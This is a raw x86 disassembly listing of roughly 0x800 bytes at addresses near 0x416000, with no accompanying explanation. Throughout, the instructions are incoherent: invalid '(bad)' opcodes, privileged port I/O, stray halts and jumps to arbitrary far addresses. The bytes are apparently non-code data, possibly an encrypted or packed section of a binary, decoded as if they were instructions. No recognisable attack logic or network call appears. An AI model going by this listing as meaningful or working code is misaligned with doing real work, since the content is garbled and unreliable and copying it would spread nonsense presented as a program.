  4167a0:	mov    ah,0xe0
  4167a2:	shl    BYTE PTR [edx-0x6b],cl
  4167a5:	fisubr DWORD PTR [edx+0x79ca43c5]
  4167ab:	jmp    0x416774
  4167ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ae:	fwait
  4167af:	xchg   ecx,eax
  4167b0:	jo     0x4167f8
  4167b2:	iret   
  4167b3:	xchg   ebx,eax
  4167b4:	je     0x4167cf
  4167b6:	pop    ebp
  4167b7:	xchg   edx,eax
  4167b8:	sbb    al,0x62
  4167ba:	mov    ebx,0xc64cc14
  4167bf:	ret    
  4167c0:	xor    edi,DWORD PTR ss:[edi+0x7dc9f319]
  4167c7:	or     eax,0x1d3fa422
  4167cc:	scas   eax,DWORD PTR es:[edi]
  4167cd:	push   cs
  4167ce:	mov    cl,0x4
  4167d0:	push   cs
  4167d1:	es pop edx
  4167d3:	or     ah,BYTE PTR [ebp-0x731208e9]
  4167d9:	add    bh,bh
  4167db:	push   esi
  4167dc:	sbb    al,0x39
  4167de:	pop    esi
  4167df:	jnp    0x41677a
  4167e1:	das    
  4167e2:	mov    al,ds:0xbba8af43
  4167e7:	icebp  
  4167e8:	cmp    DWORD PTR [ebx-0x7e],esp
  4167eb:	mov    cl,0x83
  4167ed:	daa    
  4167ee:	inc    ebp
  4167ef:	xor    ecx,ecx
  4167f1:	mov    edi,0xd97554bb
  4167f6:	scas   al,BYTE PTR es:[edi]
  4167f7:	div    BYTE PTR [ebp+0x2]
  4167fa:	mov    esi,0x1126f8ed
  4167ff:	cld    
  416800:	and    BYTE PTR [ecx+0x60],bl
  416803:	sbb    DWORD PTR [ebp+0x35e56080],ebp
  416809:	call   0x1ed0:0xf13f39bb
  416810:	into   
  416811:	sbb    dh,BYTE PTR [edi+ebp*4-0x53]
  416815:	dec    edi
  416816:	xchg   ebx,eax
  416817:	push   ebp
  416818:	push   ss
  416819:	mov    esi,0x26b35e32
  41681e:	mov    edx,0x3f113512
  416823:	jmp    0x4bee4dd2
  416828:	and    DWORD PTR [ecx+0x26],edi
  41682b:	mov    al,0xe1
  41682d:	lods   al,BYTE PTR ds:[esi]
  41682e:	in     eax,dx
  41682f:	push   es
  416830:	out    0x59,al
  416832:	or     eax,DWORD PTR [edx-0x292607b]
  416838:	fsub   DWORD PTR [esi-0x81db60c]
  41683e:	and    BYTE PTR [esi+0x1d],0xe2
  416842:	outs   dx,BYTE PTR ds:[esi]
  416843:	dec    esp
  416844:	bound  ecx,QWORD PTR [ebp+0x228584c4]
  41684a:	and    ebp,DWORD PTR [ebx+eax*1-0x58]
  41684e:	sti    
  41684f:	shl    DWORD PTR [ecx+0x17],0x46
  416853:	sbb    al,cl
  416855:	cld    
  416856:	int3   
  416857:	pop    ss
  416858:	inc    ebp
  416859:	mov    ecx,0xca31735
  41685e:	mov    esp,0x817fbad4
  416863:	cmp    ah,BYTE PTR ds:0x9cefe46f
  416869:	add    dh,BYTE PTR [edi-0x7b841ff8]
  41686f:	dec    eax
  416870:	and    DWORD PTR [ecx],ebp
  416872:	sub    edi,eax
  416874:	dec    ebp
  416875:	and    al,0x80
  416877:	push   ds
  416878:	xor    eax,0x62f263d1
  41687d:	stos   DWORD PTR es:[edi],eax
  41687e:	xor    DWORD PTR [edi+edx*1-0x6d],edi
  416882:	(bad)  
  416883:	xchg   ebx,eax
  416884:	sbb    al,0xc9
  416886:	ins    BYTE PTR es:[edi],dx
  416887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416888:	adc    BYTE PTR [ebx-0x76a867d4],ch
  41688e:	and    ebx,DWORD PTR [ebx+0x6d]
  416891:	jns    0x416911
  416893:	addr16 sbb al,0x9d
  416896:	sbb    ebp,DWORD PTR [edx]
  416898:	shl    ah,cl
  41689a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41689b:	sub    bl,BYTE PTR [edx]
  41689d:	or     DWORD PTR [ecx-0x5c49d042],ecx
  4168a3:	sbb    DWORD PTR [eax+0x5c],0x3f
  4168a7:	pop    esi
  4168a8:	push   ds
  4168a9:	mov    eax,ds:0xbe02c457
  4168ae:	xor    BYTE PTR [esi-0x23],ah
  4168b1:	cs jns 0x416871
  4168b4:	imul   ebx,DWORD PTR [ebx+edi*2+0x60d6bdc4],0xba5b5ab
  4168bf:	in     al,0x5d
  4168c1:	adc    ah,dl
  4168c3:	(bad)
  4168c6:	push   ss
  4168c7:	aad    0x1a
  4168c9:	jns    0x416860
  4168cb:	jecxz  0x416900
  4168cd:	inc    eax
  4168ce:	jb     0x416866
  4168d0:	jno    0x41686c
  4168d2:	dec    ebx
  4168d3:	outs   dx,DWORD PTR ds:[esi]
  4168d4:	bound  ebx,QWORD PTR [eax-0x15]
  4168d7:	je     0x4168e0
  4168d9:	add    ebp,ebx
  4168db:	popa   
  4168dc:	push   eax
  4168dd:	push   cs
  4168de:	mov    ecx,0x5ad0a0d4
  4168e3:	mov    ch,0xc5
  4168e5:	add    cl,BYTE PTR [edi+eiz*8]
  4168e8:	lds    edx,FWORD PTR [eax+0x22]
  4168eb:	xchg   DWORD PTR [ecx+ebp*1],ebx
  4168ee:	add    ecx,0x37
  4168f1:	pop    ecx
  4168f2:	(bad)  
  4168f3:	jcxz   0x41691d
  4168f6:	inc    edi
  4168f7:	push   eax
  4168f8:	in     eax,0xc1
  4168fa:	xchg   edx,eax
  4168fb:	call   0x4eea4b47
  416900:	sbb    DWORD PTR [ecx],ebx
  416902:	and    DWORD PTR [edx+0x133b3b2f],0x478c15ec
  41690c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41690d:	(bad)  
  41690e:	jno    0x416931
  416910:	(bad)  
  416911:	pop    ds
  416912:	pusha  
  416913:	jmp    0x4168d4
  416915:	sbb    BYTE PTR [edx-0x470c0967],0xb4
  41691c:	pusha  
  41691d:	lods   al,BYTE PTR ds:[esi]
  41691e:	dec    ecx
  41691f:	call   0x101214ea
  416924:	inc    eax
  416925:	dec    ecx
  416926:	adc    bl,bh
  416928:	shr    BYTE PTR [ebp-0x4d],cl
  41692b:	ficomp DWORD PTR [edi+0x73d4b69e]
  416931:	repz push esi
  416933:	sbb    DWORD PTR [ebp+0x5f1c489],esi
  416939:	lds    edx,FWORD PTR [edx-0x7096ddee]
  41693f:	push   edi
  416940:	shrd   DWORD PTR [edi],edi,cl
  416943:	xor    DWORD PTR [edx+edi*8-0x24],edx
  416947:	mov    ch,0x45
  416949:	sahf   
  41694a:	fwait
  41694b:	mov    edi,0x4fafda05
  416950:	mov    edx,DWORD PTR [eax+0x23c34057]
  416956:	mov    ebx,0xe68a2334
  41695b:	xchg   ebp,ecx
  41695d:	mov    ds:0xd109539b,al
  416962:	and    al,0x6d
  416964:	push   esi
  416965:	mov    bh,0x3f
  416967:	xor    BYTE PTR [edi],ch
  416969:	jmp    0xb0fdfc48
  41696e:	jne    0x416934
  416970:	loop   0x41697a
  416972:	into   
  416973:	aas    
  416974:	xchg   BYTE PTR [ebx+0xe94036b],al
  41697a:	lods   eax,DWORD PTR ds:[esi]
  41697b:	psrld  mm4,QWORD PTR [ebx+0x10e33a3d]
  416982:	pop    esi
  416983:	pop    es
  416984:	cmc    
  416985:	sub    DWORD PTR [edi-0x6114835c],esi
  41698b:	jns    0x4169b3
  41698d:	fisub  DWORD PTR [edx+0x62]
  416990:	inc    edi
  416991:	mov    ah,0xa7
  416993:	cli    
  416994:	push   edx
  416995:	loope  0x416a14
  416997:	mul    BYTE PTR [ecx+ebp*2]
  41699a:	and    al,0x66
  41699c:	cmp    eax,0x6a0e3e63
  4169a1:	push   0x4a
  4169a3:	shl    DWORD PTR [ebx+0xc],1
  4169a6:	mov    esp,0x7d06eac6
  4169ab:	or     eax,0xe8f99b91
  4169b0:	and    al,0xf9
  4169b2:	adc    DWORD PTR [ebp+ebp*8-0x4933983e],eax
  4169b9:	mov    al,ds:0xab9617db
  4169be:	enter  0xf3a2,0xde
  4169c2:	jecxz  0x416974
  4169c4:	in     eax,dx
  4169c5:	clc    
  4169c6:	cdq    
  4169c7:	inc    esi
  4169c8:	in     al,0x17
  4169ca:	mov    ebx,0x5c0a0414
  4169cf:	pop    eax
  4169d0:	cmp    al,0xe9
  4169d2:	add    al,0x6c
  4169d4:	lods   eax,DWORD PTR ds:[esi]
  4169d5:	mov    DWORD PTR [ebp-0x13a6e90f],esi
  4169db:	sub    bl,BYTE PTR ds:0x494b8b25
  4169e1:	mov    eax,ds:0xe8b732cb
  4169e6:	sub    BYTE PTR [ebp-0x504b52d3],ah
  4169ec:	and    BYTE PTR [esi-0x58],0x55
  4169f0:	inc    edx
  4169f1:	mov    ds:0xd727d0fd,al
  4169f6:	lods   al,BYTE PTR ds:[esi]
  4169f7:	mov    DWORD PTR [ebp-0x4e],0x23d4f24c
  4169fe:	sahf   
  4169ff:	push   esp
  416a00:	mov    ch,0x80
  416a02:	and    bl,BYTE PTR [esp+eax*2+0x2]
  416a06:	mov    ebp,0xeb076094
  416a0b:	pusha  
  416a0c:	out    0xe6,al
  416a0e:	inc    eax
  416a0f:	pop    ecx
  416a10:	adc    edx,DWORD PTR [esp+ebx*8]
  416a13:	ja     0x416a86
  416a15:	loope  0x416a89
  416a17:	out    dx,eax
  416a18:	xchg   ecx,eax
  416a19:	sub    DWORD PTR [ebx-0x7bf87d54],eax
  416a1f:	dec    esi
  416a20:	dec    esp
  416a21:	(bad)  
  416a22:	mov    eax,0x8cdd0569
  416a27:	out    dx,eax
  416a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a29:	fwait
  416a2a:	jb     0x4169da
  416a2c:	cs fld st(4)
  416a2f:	lea    edx,[edi+0x1d]
  416a32:	or     eax,0x18a88996
  416a37:	test   DWORD PTR [ecx-0x4b],ebx
  416a3a:	fwait
  416a3b:	dec    ebx
  416a3c:	dec    ebp
  416a3d:	fild   DWORD PTR [ecx]
  416a3f:	cli    
  416a40:	pop    es
  416a41:	in     eax,dx
  416a42:	cli    
  416a43:	es out 0x1f,eax
  416a46:	inc    eax
  416a47:	icebp  
  416a48:	inc    edi
  416a49:	leave  
  416a4a:	push   0xa7cb27c
  416a4f:	sti    
  416a50:	repnz push cs
  416a52:	mov    ch,ch
  416a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a55:	inc    esp
  416a56:	retf   0xc6a7
  416a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a5a:	lahf   
  416a5b:	inc    eax
  416a5c:	daa    
  416a5d:	popf   
  416a5e:	inc    ebx
  416a5f:	arpl   WORD PTR [ebp+0x78],bx
  416a62:	int3   
  416a63:	ja     0x416a03
  416a65:	inc    esi
  416a66:	mov    al,0x64
  416a68:	adc    ebx,ebx
  416a6a:	pop    esp
  416a6b:	bound  esp,QWORD PTR [ebp-0x116bd96]
  416a71:	jmp    0x7a8df0ea
  416a76:	fstp   TBYTE PTR [ecx]
  416a78:	and    DWORD PTR [ecx-0x7b200f2c],ebp
  416a7e:	adc    eax,0x73668554
  416a83:	jmp    0x18a4:0xbdeb5add
  416a8a:	cmc    
  416a8b:	pop    ebx
  416a8c:	sub    bh,BYTE PTR cs:[edx+0x58ebccf4]
  416a93:	fadd   QWORD PTR [ecx+0x7b6a1bcc]
  416a99:	push   0xffffffd8
  416a9b:	aas    
  416a9c:	pop    ebp
  416a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a9e:	shl    DWORD PTR [esi-0x791ef274],cl
  416aa4:	adc    BYTE PTR ds:0x1b8b64bf,dl
  416aaa:	fadd   st,st(1)
  416aac:	xchg   ebp,eax
  416aad:	mov    cl,0xa9
  416aaf:	(bad)  
  416ab0:	jmp    0x9880:0x5c285bdf
  416ab7:	out    dx,al
  416ab8:	cmp    dh,0xeb
  416abb:	add    al,0x1e
  416abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416abe:	imul   ebp,DWORD PTR [ecx],0x2f4d6a29
  416ac4:	fisttp WORD PTR [eax+ebp*4]
  416ac7:	outs   dx,BYTE PTR ds:[esi]
  416ac8:	in     al,0x9d
  416aca:	adc    DWORD PTR [eax*1+0x632b2acb],edx
  416ad1:	xor    BYTE PTR [ecx-0x55757f5c],0x3d
  416ad8:	xchg   BYTE PTR [ebx+0x0],dh
  416adb:	ss and eax,0x7db8a7a5
  416ae1:	mov    edi,0xa423448f
  416ae6:	mov    esi,0xc934bd34
  416aeb:	(bad)
  416aee:	mov    dh,0xea
  416af0:	clc    
  416af1:	ds mov ebx,0x38329ea6
  416af7:	fild   DWORD PTR [edi-0x40eb3731]
  416afd:	dec    esi
  416afe:	add    BYTE PTR gs:[ecx-0x47],ah
  416b02:	mov    ebx,0xc1a3f6ea
  416b07:	pop    edi
  416b08:	sbb    eax,0x150da92f
  416b0d:	jp     0x416aed
  416b0f:	and    BYTE PTR [esi-0x5d],ch
  416b12:	mov    ch,0x37
  416b14:	sbb    eax,0xe56e670a
  416b19:	stos   DWORD PTR es:[edi],eax
  416b1a:	inc    esi
  416b1b:	repz scas al,BYTE PTR es:[edi]
  416b1d:	dec    BYTE PTR [ebx+0x45]
  416b20:	and    al,0xb
  416b23:	adc    eax,0x150866cc
  416b28:	sbb    dl,BYTE PTR [ecx+0xcb3b211]
  416b2e:	cld    
  416b2f:	mov    ds,WORD PTR [edx-0x63]
  416b32:	mov    DWORD PTR [eax-0x67f5dee7],ecx
  416b38:	repz push ebx
  416b3a:	add    BYTE PTR [edx-0x3a8fe674],ah
  416b40:	ret    0xab9e
  416b43:	jb     0x416ac9
  416b45:	ins    BYTE PTR es:[edi],dx
  416b46:	inc    ebx
  416b47:	shl    DWORD PTR [edx],cl
  416b49:	jl     0x416bc3
  416b4b:	sub    al,BYTE PTR [edi+eax*2-0x20]
  416b4f:	hlt    
  416b50:	cmp    esp,DWORD PTR [ecx]
  416b52:	push   esp
  416b53:	pop    ebx
  416b54:	xchg   ecx,eax
  416b55:	sub    edi,0x70
  416b58:	and    dh,cl
  416b5a:	mov    ebx,DWORD PTR [eax-0x2d]
  416b5d:	outs   dx,BYTE PTR ds:[esi]
  416b5e:	xor    al,0x29
  416b60:	and    DWORD PTR [ecx],ebx
  416b62:	push   cs
  416b63:	scas   al,BYTE PTR es:[edi]
  416b64:	inc    ebp
  416b65:	fucomip st,st(5)
  416b67:	(bad)  
  416b68:	(bad)  [edi+0x7f]
  416b6b:	enter  0x9125,0x4
  416b6f:	int    0xbe
  416b71:	mov    bh,0x3f
  416b73:	test   DWORD PTR [eax],esp
  416b75:	pop    ecx
  416b76:	xchg   esi,eax
  416b77:	add    eax,0x769aabd9
  416b7c:	mov    edx,0xa3411c7b
  416b81:	sahf   
  416b82:	sbb    eax,0x132783d7
  416b87:	or     eax,0xb4b0ade6
  416b8c:	outs   dx,DWORD PTR ds:[esi]
  416b8d:	test   DWORD PTR [edx+eiz*8-0x2b],eax
  416b91:	in     eax,0x53
  416b93:	out    0x67,eax
  416b95:	or     esp,eax
  416b97:	cmp    eax,0x6644d918
  416b9c:	cmc    
  416b9d:	cmc    
  416b9e:	xor    ebp,DWORD PTR [edi-0xb]
  416ba1:	test   al,0x2b
  416ba3:	mov    BYTE PTR [edx+0x1],dl
  416ba6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba8:	push   0xffffffd2
  416baa:	jmp    0xb3ce3f65
  416baf:	xchg   esp,eax
  416bb0:	rcr    DWORD PTR [esi],cl
  416bb2:	jb     0x416bee
  416bb4:	push   ebp
  416bb5:	sar    DWORD PTR [esi-0x14],1
  416bb8:	in     al,0xfd
  416bba:	mov    edx,eax
  416bbc:	sbb    eax,0x616de7b9
  416bc1:	push   esp
  416bc2:	jns    0x416bf9
  416bc4:	push   0xcf4ab99
  416bc9:	adc    al,0x2a
  416bcb:	cli    
  416bcc:	jae    0x416c46
  416bce:	adc    eax,0x3bd77044
  416bd3:	or     BYTE PTR [ecx-0x72],ch
  416bd6:	arpl   bp,cx
  416bd8:	out    dx,al
  416bd9:	sbb    eax,0x2815f36c
  416bde:	jmp    0x4e91:0x9e1cc0f0
  416be5:	imul   ebp,DWORD PTR [esi],0x2f209739
  416beb:	push   0x7f
  416bed:	loop   0x416be9
  416bef:	jmp    0x60d6:0x98b7a259
  416bf6:	out    0xc,al
  416bf8:	mov    eax,ds:0x589d0467
  416bfd:	sub    ecx,ebp
  416bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c00:	daa    
  416c01:	add    edx,DWORD PTR [eax-0x44]
  416c04:	aad    0xb0
  416c06:	pushf  
  416c07:	lock pushf 
  416c09:	popf   
  416c0a:	dec    ebp
  416c0b:	fsub   QWORD PTR [eax]
  416c0d:	sbb    DWORD PTR [ebp+0x3b877dfc],eax
  416c13:	dec    esp
  416c14:	les    ebp,FWORD PTR [eax+0xeb0db4b]
  416c1a:	stos   DWORD PTR es:[edi],eax
  416c1b:	pusha  
  416c1c:	jo     0x416c5a
  416c1e:	pop    es
  416c1f:	int    0x1f
  416c21:	test   eax,0x80d2ec7c
  416c26:	pop    edi
  416c27:	gs dec eax
  416c29:	xchg   BYTE PTR [esi+0x3f],bl
  416c2c:	cmp    edi,DWORD PTR [edi-0x34]
  416c2f:	xor    DWORD PTR [edx],ecx
  416c31:	adc    dh,BYTE PTR [ecx]
  416c33:	mov    ds:0x10bc5030,al
  416c38:	push   ss
  416c39:	sub    DWORD PTR [eax+0x2d],ebp
  416c3c:	mov    ch,0x1c
  416c3e:	dec    edi
  416c3f:	adc    eax,0x474d68d8
  416c44:	add    DWORD PTR [edx-0x42c4bb55],ebx
  416c4a:	sub    dl,bl
  416c4c:	pop    ds
  416c4d:	jmp    0xcdcbb226
  416c52:	ja     0x416c97
  416c54:	ret    0x7ba1
  416c57:	mov    ah,0xcb
  416c59:	addr16 jge 0x416bdc
  416c5c:	fdiv   QWORD PTR [ebx]
  416c5e:	cwde   
  416c5f:	xchg   dh,al
  416c61:	push   0xffffff85
  416c63:	ss add eax,0x86c4bd31
  416c69:	xchg   esi,eax
  416c6a:	int    0x46
  416c6c:	inc    ecx
  416c6d:	mov    ds:0xbb5be30b,al
  416c72:	and    BYTE PTR [ecx-0x36],cl
  416c75:	ins    BYTE PTR es:[edi],dx
  416c76:	(bad)  
  416c77:	and    eax,0xe7c12055
  416c7c:	dec    ebx
  416c7d:	jb     0x416c13
  416c7f:	das    
  416c80:	cmp    DWORD PTR ds:0x7aacf35,ecx
  416c86:	mov    edi,0x19d712cc
  416c8b:	dec    edx
  416c8c:	out    0x24,al
  416c8e:	jecxz  0x416ca4
  416c90:	or     eax,0xe0c645a6
  416c95:	cwde   
  416c96:	ret    
  416c97:	sub    ch,ah
  416c99:	and    ch,ch
  416c9b:	out    dx,eax
  416c9c:	jae    0x416c3b
  416c9e:	cs stos DWORD PTR es:[edi],eax
  416ca0:	lea    ecx,[ecx-0xb]
  416ca3:	scas   eax,DWORD PTR es:[edi]
  416ca4:	bound  edi,QWORD PTR [esi]
  416ca6:	out    0x4e,al
  416ca8:	sahf   
  416ca9:	cdq    
  416caa:	call   0xca40ba0b
  416caf:	ret    
  416cb0:	jne    0x416d0b
  416cb2:	test   eax,0xdbf715e8
  416cb7:	xchg   DWORD PTR [ecx],esi
  416cb9:	and    BYTE PTR [eax+eiz*4+0x793ba789],al
  416cc0:	pop    ds
  416cc1:	(bad)  [ecx-0x4f]
  416cc4:	scas   eax,DWORD PTR es:[edi]
  416cc5:	mov    ds:0x802f7a0b,eax
  416cca:	hlt    
  416ccb:	sub    esi,esi
  416ccd:	ss dec ecx
  416ccf:	sub    dh,BYTE PTR [ebp-0x26a7579f]
  416cd5:	ret    0xa2db
  416cd8:	repnz xchg ecx,eax
  416cda:	sbb    bl,ch
  416cdc:	dec    ebx
  416cdd:	or     eax,0x49a5f38f
  416ce2:	sbb    al,0xe6
  416ce4:	cmp    eax,0x1cfaf635
  416ce9:	fstp   DWORD PTR [ebx]
  416ceb:	push   edx
  416cec:	inc    esp
  416ced:	pop    esp
  416cee:	pop    ebx
  416cef:	inc    esp
  416cf0:	stos   DWORD PTR es:[edi],eax
  416cf1:	(bad)  
  416cf2:	out    dx,eax
  416cf3:	or     ebx,DWORD PTR [ebx]
  416cf5:	mov    DWORD PTR [ecx+0x64fc4853],ecx
  416cfb:	dec    edi
  416cfc:	sbb    ecx,DWORD PTR [ecx]
  416cfe:	mov    ah,0x77
  416d00:	out    0x8a,eax
  416d02:	push   edi
  416d03:	pushf  
  416d04:	cmp    ebx,eax
  416d06:	stos   DWORD PTR es:[edi],eax
  416d07:	sub    edx,edi
  416d09:	pop    esp
  416d0a:	retf   
  416d0b:	mov    ebp,0x978df31c
  416d10:	and    ecx,edi
  416d12:	inc    edi
  416d13:	es popf 
  416d15:	mov    WORD PTR [edi],fs
  416d17:	jge    0x416cc5
  416d19:	mov    eax,ds:0xe68059cb
  416d1e:	sub    ecx,eax
  416d20:	pop    ebp
  416d21:	popa   
  416d22:	and    ah,ch
  416d24:	sbb    al,0xcd
  416d26:	cwde   
  416d27:	mov    ch,0x4f
  416d29:	push   ds
  416d2a:	mov    al,ds:0x6d9386f4
  416d2f:	cmp    eax,0xb82ba0d0
  416d34:	xchg   esp,eax
  416d35:	mov    eax,0xd0899c
  416d3a:	shl    BYTE PTR [ebp+0x1b],1
  416d3d:	sub    DWORD PTR [ecx+0x38497ebc],ecx
  416d43:	aaa    
  416d44:	xor    esp,DWORD PTR [esi-0x49a318c]
  416d4a:	out    0xe5,eax
  416d4c:	and    ah,BYTE PTR [ebx+0xc]
  416d4f:	adc    DWORD PTR [eax],esp
  416d51:	test   eax,0x6803a68a
  416d56:	and    bh,BYTE PTR ds:0xe31b9e64
  416d5c:	push   edx
  416d5d:	ja     0x416d98
  416d5f:	stos   DWORD PTR es:[edi],eax
  416d60:	enter  0x4c84,0x96
  416d64:	jns    0x416dc9
  416d66:	mov    ss,WORD PTR [esi-0x6e]
  416d69:	shl    ah,0x10
  416d6c:	pop    ebp
  416d6d:	cs mov edi,0x7ea995e6
  416d73:	call   0xfbb92ec
  416d78:	sbb    cl,BYTE PTR [ecx+0x35a15fd2]
  416d7e:	mov    ch,0x61
  416d80:	pop    edx
  416d81:	jge    0x416d10
  416d83:	clc    
  416d84:	jecxz  0x416d2d
  416d86:	dec    ebx
  416d87:	inc    ebx
  416d88:	add    al,0xac
  416d8a:	sahf   
  416d8b:	fisub  DWORD PTR [edx]
  416d8d:	pop    ecx
  416d8e:	adc    al,ah
  416d90:	cmc    
  416d91:	pop    edx
  416d92:	int    0xbe
  416d94:	retf   0x2bbb
  416d97:	ins    BYTE PTR es:[edi],dx
  416d98:	fcmovnb st,st(3)
  416d9a:	xor    al,0xba
  416d9c:	pop    ds
  416d9d:	popf   
  416d9e:	add    eax,0xcda9acd6
  416da3:	movsx  esp,WORD PTR [ebp-0x2e44755]
  416daa:	sti    
  416dab:	imul   esi,DWORD PTR [esi-0x1edeb0f7],0x17
  416db2:	sub    al,0x73
  416db4:	iret   
  416db5:	test   BYTE PTR [ecx+0x109739a1],bh
  416dbb:	test   BYTE PTR [ebp+0x6c],ch
  416dbe:	mov    ch,0x14
  416dc0:	add    ebp,DWORD PTR [esi-0x76da6ed0]
  416dc6:	sub    edx,ebp
  416dc8:	push   ss
  416dc9:	sub    eax,0x59289f30
  416dce:	and    bh,BYTE PTR [ebx-0x357e2ebe]
  416dd4:	push   ss
  416dd5:	pop    eax
  416dd6:	imul   ebx,DWORD PTR [esi*2-0x740f30c5],0x49
  416dde:	xor    BYTE PTR [ecx+0x24],bh
  416de1:	cdq    
  416de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de3:	js     0x416e48
  416de5:	add    DWORD PTR [eax-0x445b10f6],ebp
  416deb:	xlat   BYTE PTR ds:[ebx]
  416dec:	mov    bl,0xe6
  416dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416def:	popa   
  416df0:	mov    bh,0xe1
  416df2:	add    ch,dh
  416df4:	outs   dx,DWORD PTR ds:[esi]
  416df5:	xchg   ebx,eax
  416df6:	mov    esp,0xd1f48ae4
  416dfb:	xchg   ecx,eax
  416dfc:	test   eax,0xbfe0b56b
  416e01:	leave  
  416e02:	mov    esp,0x1a9bc664
  416e07:	imul   esi,DWORD PTR [esi],0x57
  416e0a:	mov    edi,0xc6918ff4
  416e0f:	xor    DWORD PTR [ebp+0x76],edx
  416e12:	mov    eax,0xe49f57f1
  416e17:	and    BYTE PTR [esi],bl
  416e19:	test   eax,0xe7acc02e
  416e1e:	mov    esi,0x8ba90b0a
  416e23:	test   DWORD PTR [esi+0x5e2ea858],eax
  416e29:	ds dec esp
  416e2b:	test   BYTE PTR [ebx],ah
  416e2d:	leave  
  416e2e:	push   eax
  416e2f:	lods   al,BYTE PTR fs:[esi]
  416e31:	push   ds
  416e32:	push   esp
  416e33:	cwde   
  416e34:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e36:	or     edi,ecx
  416e38:	dec    ebp
  416e39:	data16 jmp 0x416ea7
  416e3c:	loop   0x416e65
  416e3e:	adc    DWORD PTR [ebx],0xb4b2b2d0
  416e44:	leave  
  416e45:	retf   0x44de
  416e48:	aad    0x9c
  416e4a:	or     edx,esi
  416e4c:	push   0x6c
  416e4e:	icebp  
  416e4f:	rcl    BYTE PTR [edi],0x69
  416e52:	sub    eax,0xaa20c569
  416e57:	dec    ebx
  416e58:	js     0x416e6f
  416e5a:	jl     0x416e12
  416e5c:	add    DWORD PTR [esi-0x32149fce],eax
  416e62:	pop    ebp
  416e63:	icebp  
  416e64:	imul   BYTE PTR [ecx]
  416e66:	das    
  416e67:	out    dx,al
  416e68:	(bad)  
  416e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e6a:	xor    esp,DWORD PTR [edx+0x3b299823]
  416e70:	mov    ebp,0xd9830b9b
  416e75:	out    dx,al
  416e76:	inc    edx
  416e77:	stos   DWORD PTR es:[edi],eax
  416e78:	shr    ebx,cl
  416e7a:	cli    
  416e7b:	mov    DWORD PTR [ebp-0x345b4dff],ebx
  416e81:	sbb    al,0xac
  416e83:	shl    DWORD PTR [ebp-0x4f0f347f],cl
  416e89:	adc    ebx,DWORD PTR [ebp-0x24]
  416e8c:	sbb    ecx,DWORD PTR [ecx]
  416e8e:	inc    ebp
  416e8f:	jecxz  0x416f0e
  416e91:	jnp    0x416e64
  416e93:	mov    ds:0x948c1701,eax
  416e98:	dec    esi
  416e99:	pop    edx
  416e9a:	movhlps xmm7,xmm4
  416e9d:	adc    bh,bh
  416e9f:	jmp    0x27847ba
  416ea4:	mov    ch,0xb0
  416ea6:	add    al,0x38
  416ea8:	push   edx
  416ea9:	test   al,0x6b
  416eab:	mov    ebx,0xd50181f7
  416eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb1:	sbb    ch,ch
  416eb3:	jmp    0x416ef9
  416eb5:	mov    eax,0x99cfa4b8
  416eba:	call   0x21e1:0x527aa915
  416ec1:	mov    ah,0xb4
  416ec3:	add    al,0xe
  416ec5:	xchg   edi,eax
  416ec6:	mov    esi,DWORD PTR [edi+0xd]
  416ec9:	sbb    ebp,DWORD PTR [ebx]
  416ecb:	in     eax,0x17
  416ecd:	and    DWORD PTR [edi],edx
  416ecf:	sub    al,BYTE PTR [edx-0x49707465]
  416ed5:	sub    DWORD PTR [edx+0x74],eax
  416ed8:	sbb    DWORD PTR [edx-0x36],esp
  416edb:	stc    
  416edc:	sbb    eax,0x2c5c82a9
  416ee1:	idiv   BYTE PTR [ebx-0x21]
  416ee4:	icebp  
  416ee5:	pushf  
  416ee6:	sbb    ecx,DWORD PTR [ebx]
  416ee8:	and    eax,0x8ca6693e
  416eed:	xor    al,0x0
  416eef:	cmp    al,0x84
  416ef1:	faddp  st(5),st
  416ef3:	lea    eax,fs:[ebx]
  416ef6:	pop    edx
  416ef7:	pop    ebx
  416ef8:	and    al,0xbd
  416efa:	ret    
  416efb:	fwait
  416efc:	mov    dl,0xdf
  416efe:	in     eax,dx
  416eff:	jle    0x416edc
  416f01:	test   al,0x6b
  416f03:	inc    DWORD PTR [edx+0x3c]
  416f06:	arpl   bx,sp
  416f08:	push   esp
  416f09:	test   eax,0xfedc586
  416f0e:	xchg   ebx,eax
  416f0f:	test   DWORD PTR [esi+0x6],0x1ad5689a
  416f16:	push   esp
  416f17:	call   0xadd77c35
  416f1c:	sbb    al,0xe9
  416f1e:	lods   eax,DWORD PTR ds:[esi]
  416f1f:	add    esi,DWORD PTR [edx]
  416f21:	xrelease mov BYTE PTR ds:0xd0137374,al
  416f28:	push   esi
  416f29:	xchg   BYTE PTR [ebx+0x33a3842f],bh
  416f2f:	mov    ah,0x43
  416f31:	shl    DWORD PTR [eax-0x420dcce0],cl
  416f37:	hlt    
  416f38:	jl     0x416f42
  416f3a:	jl     0x416f5d
  416f3c:	test   DWORD PTR [esi-0x450217fd],esi
  416f42:	repnz mov ch,0xe5
  416f45:	mov    esp,0xd9a5694f
  416f4a:	cmp    ch,al
  416f4c:	daa    
  416f4d:	jns    0x416fa3
  416f4f:	push   ecx
  416f50:	sbb    DWORD PTR gs:[esi+ebp*8+0x72],esi
  416f55:	dec    esi
  416f56:	push   es
  416f57:	cmp    al,0x1f
  416f59:	stc    
  416f5a:	sbb    bl,BYTE PTR [edx]
  416f5c:	daa    
  416f5d:	sahf   
  416f5e:	push   esi
  416f5f:	stos   BYTE PTR es:[edi],al
  416f60:	or     al,0xa2
  416f62:	jp     0x416f26
  416f64:	xchg   edi,eax
  416f65:	adc    al,0x6d
  416f67:	mov    esp,0xece37b51
  416f6c:	icebp  
  416f6d:	(bad)  
